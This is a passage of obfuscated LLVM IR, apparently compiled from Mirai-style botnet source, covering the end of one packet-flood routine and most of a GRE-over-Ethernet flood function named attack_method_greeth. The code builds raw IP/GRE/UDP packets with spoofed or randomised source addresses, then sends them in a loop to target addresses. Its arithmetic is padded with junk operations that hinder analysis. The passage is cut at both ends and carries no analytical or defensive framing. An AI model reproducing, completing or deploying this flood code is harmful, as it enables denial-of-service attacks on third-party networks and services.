  %460 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %459, i32 0, i32 9
  store i32 %458, i32* %460, align 4
  br label %461

; <label>:461:                                    ; preds = %455, %451
  %462 = load i8, i8* %19, align 1
  %463 = icmp ne i8 %462, 0
  br i1 %463, label %464, label %467

; <label>:464:                                    ; preds = %461
  %465 = load i8*, i8** %31, align 8
  %466 = load i32, i32* %18, align 4
  call void @rand_str(i8* %465, i32 %466)
  br label %467

; <label>:467:                                    ; preds = %464, %461
  %468 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %469 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %468, i32 0, i32 7
  store i16 0, i16* %469, align 2
  %470 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %471 = bitcast %struct.iphdr* %470 to i16*
  %472 = call zeroext i16 @checksum_generic(i16* %471, i32 20)
  %473 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %474 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %473, i32 0, i32 7
  store i16 %472, i16* %474, align 2
  %475 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %476 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %475, i32 0, i32 7
  store i16 0, i16* %476, align 2
  %477 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %478 = bitcast %struct.iphdr* %477 to i16*
  %479 = call zeroext i16 @checksum_generic(i16* %478, i32 20)
  %480 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %481 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %480, i32 0, i32 7
  store i16 %479, i16* %481, align 2
  %482 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %483 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %482, i32 0, i32 3
  store i16 0, i16* %483, align 2
  %484 = load %struct.iphdr*, %struct.iphdr** %29, align 8
  %485 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %486 = bitcast %struct.udphdr* %485 to i8*
  %487 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %488 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %487, i32 0, i32 2
  %489 = load i16, i16* %488, align 2
  %490 = load i32, i32* %18, align 4
  %491 = sext i32 %490 to i64
  %492 = sub i64 8, -788078878059960138
  %493 = add i64 %492, %491
  %494 = add i64 %493, -788078878059960138
  %495 = add i64 8, %491
  %496 = trunc i64 %494 to i32
  %497 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %484, i8* %486, i16 zeroext %489, i32 %496)
  %498 = load %struct.udphdr*, %struct.udphdr** %30, align 8
  %499 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %498, i32 0, i32 3
  store i16 %497, i16* %499, align 2
  %500 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %501 = load i32, i32* %9, align 4
  %502 = sext i32 %501 to i64
  %503 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %500, i64 %502
  %504 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %503, i32 0, i32 0
  %505 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %504, i32 0, i32 0
  store i16 2, i16* %505, align 4
  %506 = load %struct.iphdr*, %struct.iphdr** %27, align 8
  %507 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %506, i32 0, i32 9
  %508 = load i32, i32* %507, align 4
  %509 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %510 = load i32, i32* %9, align 4
  %511 = sext i32 %510 to i64
  %512 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %509, i64 %511
  %513 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %512, i32 0, i32 0
  %514 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %513, i32 0, i32 2
  %515 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %514, i32 0, i32 0
  store i32 %508, i32* %515, align 4
  %516 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %517 = load i32, i32* %9, align 4
  %518 = sext i32 %517 to i64
  %519 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %516, i64 %518
  %520 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %519, i32 0, i32 0
  %521 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %520, i32 0, i32 1
  store i16 0, i16* %521, align 2
  %522 = load i32, i32* %10, align 4
  %523 = load i8*, i8** %26, align 8
  %524 = load i32, i32* %18, align 4
  %525 = sext i32 %524 to i64
  %526 = sub i64 0, 52
  %527 = sub i64 0, %525
  %528 = add i64 %526, %527
  %529 = sub i64 0, %528
  %530 = add i64 52, %525
  %531 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %532 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %533 = load i32, i32* %9, align 4
  %534 = sext i32 %533 to i64
  %535 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %532, i64 %534
  %536 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %535, i32 0, i32 0
  %537 = bitcast %struct.sockaddr_in* %536 to %struct.sockaddr*
  store %struct.sockaddr* %537, %struct.sockaddr** %531, align 8
  %538 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %539 = load %struct.sockaddr*, %struct.sockaddr** %538, align 8
  %540 = call i64 @sendto(i32 %522, i8* %523, i64 %529, i32 16384, %struct.sockaddr* %539, i32 16)
  br label %541

; <label>:541:                                    ; preds = %467
  %542 = load i32, i32* %9, align 4
  %543 = sub i32 %542, -224572616
  %544 = add i32 %543, 1
  %545 = add i32 %544, -224572616
  %546 = add nsw i32 %542, 1
  store i32 %545, i32* %9, align 4
  br label %324

; <label>:547:                                    ; preds = %324
  br label %323

; <label>:548:                                    ; preds = %84, %78
  ret void
}

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #1

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) #1

declare i32 @close(i32) #3

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) #2

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) #2

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_greeth(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option*) #0 {
  %5 = alloca i8, align 1
  %6 = alloca %struct.attack_target*, align 8
  %7 = alloca i8, align 1
  %8 = alloca %struct.attack_option*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8**, align 8
  %12 = alloca i8, align 1
  %13 = alloca i16, align 2
  %14 = alloca i8, align 1
  %15 = alloca i8, align 1
  %16 = alloca i16, align 2
  %17 = alloca i16, align 2
  %18 = alloca i32, align 4
  %19 = alloca i8, align 1
  %20 = alloca i8, align 1
  %21 = alloca i32, align 4
  %22 = alloca %struct.iphdr*, align 8
  %23 = alloca %struct.grehdr*, align 8
  %24 = alloca %struct.ethhdr*, align 8
  %25 = alloca %struct.iphdr*, align 8
  %26 = alloca %struct.udphdr*, align 8
  %27 = alloca i32, align 4
  %28 = alloca i32, align 4
  %29 = alloca i32, align 4
  %30 = alloca i8*, align 8
  %31 = alloca %struct.iphdr*, align 8
  %32 = alloca %struct.grehdr*, align 8
  %33 = alloca %struct.ethhdr*, align 8
  %34 = alloca %struct.iphdr*, align 8
  %35 = alloca %struct.udphdr*, align 8
  %36 = alloca i8*, align 8
  %37 = alloca i32, align 4
  %38 = alloca i32, align 4
  %39 = alloca i32, align 4
  %40 = alloca %union.__CONST_SOCKADDR_ARG, align 8
  store i8 %0, i8* %5, align 1
  store %struct.attack_target* %1, %struct.attack_target** %6, align 8
  store i8 %2, i8* %7, align 1
  store %struct.attack_option* %3, %struct.attack_option** %8, align 8
  %41 = load i8, i8* %5, align 1
  %42 = zext i8 %41 to i64
  %43 = call noalias i8* @calloc(i64 %42, i64 8) #6
  %44 = bitcast i8* %43 to i8**
  store i8** %44, i8*** %11, align 8
  %45 = load i8, i8* %7, align 1
  %46 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %47 = call i32 @attack_get_opt_int(i8 zeroext %45, %struct.attack_option* %46, i8 zeroext 2, i32 0)
  %48 = trunc i32 %47 to i8
  store i8 %48, i8* %12, align 1
  %49 = load i8, i8* %7, align 1
  %50 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %51 = call i32 @attack_get_opt_int(i8 zeroext %49, %struct.attack_option* %50, i8 zeroext 3, i32 65535)
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* %13, align 2
  %53 = load i8, i8* %7, align 1
  %54 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %55 = call i32 @attack_get_opt_int(i8 zeroext %53, %struct.attack_option* %54, i8 zeroext 4, i32 64)
  %56 = trunc i32 %55 to i8
  store i8 %56, i8* %14, align 1
  %57 = load i8, i8* %7, align 1
  %58 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %59 = call i32 @attack_get_opt_int(i8 zeroext %57, %struct.attack_option* %58, i8 zeroext 5, i32 1)
  %60 = trunc i32 %59 to i8
  store i8 %60, i8* %15, align 1
  %61 = load i8, i8* %7, align 1
  %62 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %63 = call i32 @attack_get_opt_int(i8 zeroext %61, %struct.attack_option* %62, i8 zeroext 6, i32 65535)
  %64 = trunc i32 %63 to i16
  store i16 %64, i16* %16, align 2
  %65 = load i8, i8* %7, align 1
  %66 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %67 = call i32 @attack_get_opt_int(i8 zeroext %65, %struct.attack_option* %66, i8 zeroext 7, i32 65535)
  %68 = trunc i32 %67 to i16
  store i16 %68, i16* %17, align 2
  %69 = load i8, i8* %7, align 1
  %70 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %71 = call i32 @attack_get_opt_int(i8 zeroext %69, %struct.attack_option* %70, i8 zeroext 0, i32 512)
  store i32 %71, i32* %18, align 4
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 1, i32 1)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %19, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 19, i32 0)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %20, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = load i32, i32* @LOCAL_ADDR, align 4
  %83 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 25, i32 %82)
  store i32 %83, i32* %21, align 4
  %84 = call i32 @socket(i32 2, i32 3, i32 6) #6
  store i32 %84, i32* %10, align 4
  %85 = icmp eq i32 %84, -1
  br i1 %85, label %86, label %87

; <label>:86:                                     ; preds = %4
  br label %573

; <label>:87:                                     ; preds = %4
  store i32 1, i32* %9, align 4
  %88 = load i32, i32* %10, align 4
  %89 = bitcast i32* %9 to i8*
  %90 = call i32 @setsockopt(i32 %88, i32 0, i32 3, i8* %89, i32 4) #6
  %91 = icmp eq i32 %90, -1
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %87
  %93 = load i32, i32* %10, align 4
  %94 = call i32 @close(i32 %93)
  br label %573

; <label>:95:                                     ; preds = %87
  store i32 0, i32* %9, align 4
  br label %96

; <label>:96:                                     ; preds = %315, %95
  %97 = load i32, i32* %9, align 4
  %98 = load i8, i8* %5, align 1
  %99 = zext i8 %98 to i32
  %100 = icmp slt i32 %97, %99
  br i1 %100, label %101, label %321

; <label>:101:                                    ; preds = %96
  %102 = call noalias i8* @calloc(i64 1510, i64 8) #6
  %103 = load i8**, i8*** %11, align 8
  %104 = load i32, i32* %9, align 4
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds i8*, i8** %103, i64 %105
  store i8* %102, i8** %106, align 8
  %107 = load i8**, i8*** %11, align 8
  %108 = load i32, i32* %9, align 4
  %109 = sext i32 %108 to i64
  %110 = getelementptr inbounds i8*, i8** %107, i64 %109
  %111 = load i8*, i8** %110, align 8
  %112 = bitcast i8* %111 to %struct.iphdr*
  store %struct.iphdr* %112, %struct.iphdr** %22, align 8
  %113 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %114 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %113, i64 1
  %115 = bitcast %struct.iphdr* %114 to %struct.grehdr*
  store %struct.grehdr* %115, %struct.grehdr** %23, align 8
  %116 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %117 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %116, i64 1
  %118 = bitcast %struct.grehdr* %117 to %struct.ethhdr*
  store %struct.ethhdr* %118, %struct.ethhdr** %24, align 8
  %119 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %120 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %119, i64 1
  %121 = bitcast %struct.ethhdr* %120 to %struct.iphdr*
  store %struct.iphdr* %121, %struct.iphdr** %25, align 8
  %122 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %123 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %122, i64 1
  %124 = bitcast %struct.iphdr* %123 to %struct.udphdr*
  store %struct.udphdr* %124, %struct.udphdr** %26, align 8
  %125 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %126 = bitcast %struct.iphdr* %125 to i8*
  %127 = load i8, i8* %126, align 4
  %128 = xor i8 15, -1
  %129 = xor i8 %127, %128
  %130 = and i8 %129, %127
  %131 = and i8 %127, 15
  %132 = and i8 %130, 64
  %133 = xor i8 %130, 64
  %134 = or i8 %132, %133
  %135 = or i8 %130, 64
  store i8 %134, i8* %126, align 4
  %136 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %137 = bitcast %struct.iphdr* %136 to i8*
  %138 = load i8, i8* %137, align 4
  %139 = xor i8 %138, -1
  %140 = xor i8 -16, -1
  %141 = xor i8 -70, -1
  %142 = or i8 %139, %140
  %143 = or i8 -70, %141
  %144 = xor i8 %142, -1
  %145 = and i8 %144, %143
  %146 = and i8 %138, -16
  %147 = and i8 %145, 5
  %148 = xor i8 %145, 5
  %149 = or i8 %147, %148
  %150 = or i8 %145, 5
  store i8 %149, i8* %137, align 4
  %151 = load i8, i8* %12, align 1
  %152 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %153 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %152, i32 0, i32 1
  store i8 %151, i8* %153, align 1
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = sub i64 66, -2643500742840668041
  %157 = add i64 %156, %155
  %158 = add i64 %157, -2643500742840668041
  %159 = add i64 66, %155
  %160 = trunc i64 %158 to i16
  %161 = call zeroext i16 @htons(i16 zeroext %160) #7
  %162 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %163 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %162, i32 0, i32 2
  store i16 %161, i16* %163, align 2
  %164 = load i16, i16* %13, align 2
  %165 = call zeroext i16 @htons(i16 zeroext %164) #7
  %166 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %167 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %166, i32 0, i32 3
  store i16 %165, i16* %167, align 4
  %168 = load i8, i8* %14, align 1
  %169 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %170 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %169, i32 0, i32 5
  store i8 %168, i8* %170, align 4
  %171 = load i8, i8* %15, align 1
  %172 = icmp ne i8 %171, 0
  br i1 %172, label %173, label %177

; <label>:173:                                    ; preds = %101
  %174 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %175 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %176 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %175, i32 0, i32 4
  store i16 %174, i16* %176, align 2
  br label %177

; <label>:177:                                    ; preds = %173, %101
  %178 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %179 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %178, i32 0, i32 6
  store i8 47, i8* %179, align 1
  %180 = load i32, i32* %21, align 4
  %181 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %182 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %181, i32 0, i32 8
  store i32 %180, i32* %182, align 4
  %183 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %184 = load i32, i32* %9, align 4
  %185 = sext i32 %184 to i64
  %186 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i64 %185
  %187 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %186, i32 0, i32 1
  %188 = load i32, i32* %187, align 4
  %189 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %190 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %189, i32 0, i32 9
  store i32 %188, i32* %190, align 4
  %191 = call zeroext i16 @htons(i16 zeroext 25944) #7
  %192 = load %struct.grehdr*, %struct.grehdr** %23, align 8
  %193 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %192, i32 0, i32 1
  store i16 %191, i16* %193, align 2
  %194 = call zeroext i16 @htons(i16 zeroext 2048) #7
  %195 = load %struct.ethhdr*, %struct.ethhdr** %24, align 8
  %196 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %195, i32 0, i32 2
  store i16 %194, i16* %196, align 1
  %197 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %198 = bitcast %struct.iphdr* %197 to i8*
  %199 = load i8, i8* %198, align 4
  %200 = xor i8 15, -1
  %201 = xor i8 %199, %200
  %202 = and i8 %201, %199
  %203 = and i8 %199, 15
  %204 = xor i8 %202, -1
  %205 = xor i8 64, -1
  %206 = xor i8 35, -1
  %207 = and i8 %204, 35
  %208 = and i8 %202, %206
  %209 = and i8 %205, 35
  %210 = and i8 64, %206
  %211 = or i8 %207, %208
  %212 = or i8 %209, %210
  %213 = xor i8 %211, %212
  %214 = or i8 %204, %205
  %215 = xor i8 %214, -1
  %216 = or i8 35, %206
  %217 = and i8 %215, %216
  %218 = or i8 %213, %217
  %219 = or i8 %202, 64
  store i8 %218, i8* %198, align 4
  %220 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %221 = bitcast %struct.iphdr* %220 to i8*
  %222 = load i8, i8* %221, align 4
  %223 = xor i8 -16, -1
  %224 = xor i8 %222, %223
  %225 = and i8 %224, %222
  %226 = and i8 %222, -16
  %227 = and i8 %225, 5
  %228 = xor i8 %225, 5
  %229 = or i8 %227, %228
  %230 = or i8 %225, 5
  store i8 %229, i8* %221, align 4
  %231 = load i8, i8* %12, align 1
  %232 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %233 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %232, i32 0, i32 1
  store i8 %231, i8* %233, align 1
  %234 = load i32, i32* %18, align 4
  %235 = sext i32 %234 to i64
  %236 = sub i64 28, 3144639198598364819
  %237 = add i64 %236, %235
  %238 = add i64 %237, 3144639198598364819
  %239 = add i64 28, %235
  %240 = trunc i64 %238 to i16
  %241 = call zeroext i16 @htons(i16 zeroext %240) #7
  %242 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %243 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %242, i32 0, i32 2
  store i16 %241, i16* %243, align 2
  %244 = load i16, i16* %13, align 2
  %245 = zext i16 %244 to i32
  %246 = xor i32 %245, -1
  %247 = and i32 -1, %246
  %248 = xor i32 -1, -1
  %249 = and i32 %245, %248
  %250 = or i32 %247, %249
  %251 = xor i32 %245, -1
  %252 = trunc i32 %250 to i16
  %253 = call zeroext i16 @htons(i16 zeroext %252) #7
  %254 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %255 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %254, i32 0, i32 3
  store i16 %253, i16* %255, align 4
  %256 = load i8, i8* %14, align 1
  %257 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %258 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %257, i32 0, i32 5
  store i8 %256, i8* %258, align 4
  %259 = load i8, i8* %15, align 1
  %260 = icmp ne i8 %259, 0
  br i1 %260, label %261, label %265

; <label>:261:                                    ; preds = %177
  %262 = call zeroext i16 @htons(i16 zeroext 16384) #7
  %263 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %264 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %263, i32 0, i32 4
  store i16 %262, i16* %264, align 2
  br label %265

; <label>:265:                                    ; preds = %261, %177
  %266 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %267 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %266, i32 0, i32 6
  store i8 17, i8* %267, align 1
  %268 = call i32 @rand_next()
  %269 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %270 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %269, i32 0, i32 8
  store i32 %268, i32* %270, align 4
  %271 = load i8, i8* %20, align 1
  %272 = icmp ne i8 %271, 0
  br i1 %272, label %273, label %279

; <label>:273:                                    ; preds = %265
  %274 = load %struct.iphdr*, %struct.iphdr** %22, align 8
  %275 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %274, i32 0, i32 9
  %276 = load i32, i32* %275, align 4
  %277 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %278 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %277, i32 0, i32 9
  store i32 %276, i32* %278, align 4
  br label %295

; <label>:279:                                    ; preds = %265
  %280 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %281 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %280, i32 0, i32 8
  %282 = load i32, i32* %281, align 4
  %283 = add i32 %282, -1410697936
  %284 = sub i32 %283, 1024
  %285 = sub i32 %284, -1410697936
  %286 = sub i32 %282, 1024
  %287 = xor i32 %285, -1
  %288 = and i32 -1, %287
  %289 = xor i32 -1, -1
  %290 = and i32 %285, %289
  %291 = or i32 %288, %290
  %292 = xor i32 %285, -1
  %293 = load %struct.iphdr*, %struct.iphdr** %25, align 8
  %294 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %293, i32 0, i32 9
  store i32 %291, i32* %294, align 4
  br label %295

; <label>:295:                                    ; preds = %279, %273
  %296 = load i16, i16* %16, align 2
  %297 = call zeroext i16 @htons(i16 zeroext %296) #7
  %298 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %299 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %298, i32 0, i32 0
  store i16 %297, i16* %299, align 2
  %300 = load i16, i16* %17, align 2
  %301 = call zeroext i16 @htons(i16 zeroext %300) #7
  %302 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %303 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %302, i32 0, i32 1
  store i16 %301, i16* %303, align 2
  %304 = load i32, i32* %18, align 4
  %305 = sext i32 %304 to i64
  %306 = sub i64 0, 8
  %307 = sub i64 0, %305
  %308 = add i64 %306, %307
  %309 = sub i64 0, %308
  %310 = add i64 8, %305
  %311 = trunc i64 %309 to i16
  %312 = call zeroext i16 @htons(i16 zeroext %311) #7
  %313 = load %struct.udphdr*, %struct.udphdr** %26, align 8
  %314 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %313, i32 0, i32 2
  store i16 %312, i16* %314, align 2
  br label %315

; <label>:315:                                    ; preds = %295
  %316 = load i32, i32* %9, align 4
  %317 = sub i32 %316, 1112585709
  %318 = add i32 %317, 1
  %319 = add i32 %318, 1112585709
  %320 = add nsw i32 %316, 1
  store i32 %319, i32* %9, align 4
  br label %96

; <label>:321:                                    ; preds = %96
  br label %322

; <label>:322:                                    ; preds = %572, %321
  store i32 0, i32* %9, align 4
  br label %323

; <label>:323:                                    ; preds = %566, %322
  %324 = load i32, i32* %9, align 4
  %325 = load i8, i8* %5, align 1
  %326 = zext i8 %325 to i32
  %327 = icmp slt i32 %324, %326
  br i1 %327, label %328, label %572

; <label>:328:                                    ; preds = %323
  %329 = load i8**, i8*** %11, align 8
  %330 = load i32, i32* %9, align 4
  %331 = sext i32 %330 to i64
  %332 = getelementptr inbounds i8*, i8** %329, i64 %331
  %333 = load i8*, i8** %332, align 8
  store i8* %333, i8** %30, align 8
  %334 = load i8*, i8** %30, align 8
  %335 = bitcast i8* %334 to %struct.iphdr*
  store %struct.iphdr* %335, %struct.iphdr** %31, align 8
  %336 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %337 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %336, i64 1
  %338 = bitcast %struct.iphdr* %337 to %struct.grehdr*
  store %struct.grehdr* %338, %struct.grehdr** %32, align 8
  %339 = load %struct.grehdr*, %struct.grehdr** %32, align 8
  %340 = getelementptr inbounds %struct.grehdr, %struct.grehdr* %339, i64 1
  %341 = bitcast %struct.grehdr* %340 to %struct.ethhdr*
  store %struct.ethhdr* %341, %struct.ethhdr** %33, align 8
  %342 = load %struct.ethhdr*, %struct.ethhdr** %33, align 8
  %343 = getelementptr inbounds %struct.ethhdr, %struct.ethhdr* %342, i64 1
  %344 = bitcast %struct.ethhdr* %343 to %struct.iphdr*
  store %struct.iphdr* %344, %struct.iphdr** %34, align 8
  %345 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %346 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %345, i64 1
  %347 = bitcast %struct.iphdr* %346 to %struct.udphdr*
  store %struct.udphdr* %347, %struct.udphdr** %35, align 8
  %348 = load %struct.udphdr*, %struct.udphdr** %35, align 8
  %349 = getelementptr inbounds %struct.udphdr, %struct.udphdr* %348, i64 1
  %350 = bitcast %struct.udphdr* %349 to i8*
  store i8* %350, i8** %36, align 8
  %351 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %352 = load i32, i32* %9, align 4
  %353 = sext i32 %352 to i64
  %354 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %351, i64 %353
  %355 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %354, i32 0, i32 2
  %356 = load i8, i8* %355, align 4
  %357 = zext i8 %356 to i32
  %358 = icmp slt i32 %357, 32
  br i1 %358, label %359, label %383

; <label>:359:                                    ; preds = %328
  %360 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %361 = load i32, i32* %9, align 4
  %362 = sext i32 %361 to i64
  %363 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %360, i64 %362
  %364 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %363, i32 0, i32 1
  %365 = load i32, i32* %364, align 4
  %366 = call i32 @ntohl(i32 %365) #7
  %367 = call i32 @rand_next()
  %368 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %369 = load i32, i32* %9, align 4
  %370 = sext i32 %369 to i64
  %371 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %368, i64 %370
  %372 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %371, i32 0, i32 2
  %373 = load i8, i8* %372, align 4
  %374 = zext i8 %373 to i32
  %375 = lshr i32 %367, %374
  %376 = sub i32 %366, -252842953
  %377 = add i32 %376, %375
  %378 = add i32 %377, -252842953
  %379 = add i32 %366, %375
  %380 = call i32 @htonl(i32 %378) #7
  %381 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %382 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %381, i32 0, i32 9
  store i32 %380, i32* %382, align 4
  br label %383

; <label>:383:                                    ; preds = %359, %328
  %384 = load i32, i32* %21, align 4
  %385 = icmp eq i32 %384, -1
  br i1 %385, label %386, label %390

; <label>:386:                                    ; preds = %383
  %387 = call i32 @rand_next()
  %388 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %389 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %388, i32 0, i32 8
  store i32 %387, i32* %389, align 4
  br label %390

; <label>:390:                                    ; preds = %386, %383
  %391 = load i16, i16* %13, align 2
  %392 = zext i16 %391 to i32
  %393 = icmp eq i32 %392, 65535
  br i1 %393, label %394, label %420

; <label>:394:                                    ; preds = %390
  %395 = call i32 @rand_next()
  %396 = xor i32 65535, -1
  %397 = xor i32 %395, %396
  %398 = and i32 %397, %395
  %399 = and i32 %395, 65535
  %400 = trunc i32 %398 to i16
  %401 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %402 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %401, i32 0, i32 3
  store i16 %400, i16* %402, align 4
  %403 = load %struct.iphdr*, %struct.iphdr** %31, align 8
  %404 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %403, i32 0, i32 3
  %405 = load i16, i16* %404, align 4
  %406 = zext i16 %405 to i32
  %407 = add i32 %406, -1239054247
  %408 = sub i32 %407, 1000
  %409 = sub i32 %408, -1239054247
  %410 = sub nsw i32 %406, 1000
  %411 = xor i32 %409, -1
  %412 = and i32 -1, %411
  %413 = xor i32 -1, -1
  %414 = and i32 %409, %413
  %415 = or i32 %412, %414
  %416 = xor i32 %409, -1
  %417 = trunc i32 %415 to i16
  %418 = load %struct.iphdr*, %struct.iphdr** %34, align 8
  %419 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %418, i32 0, i32 3
  store i16 %417, i16* %419, align 4
  br label %420

; <label>:420:                                    ; preds = %394, %390
  %421 = load i16, i16* %16, align 2
  %422 = zext i16 %421 to i32
  %423 = icmp eq i32 %422, 65535
  br i1 %423, label %424, label %433

; <label>:424:                                    ; preds = %420
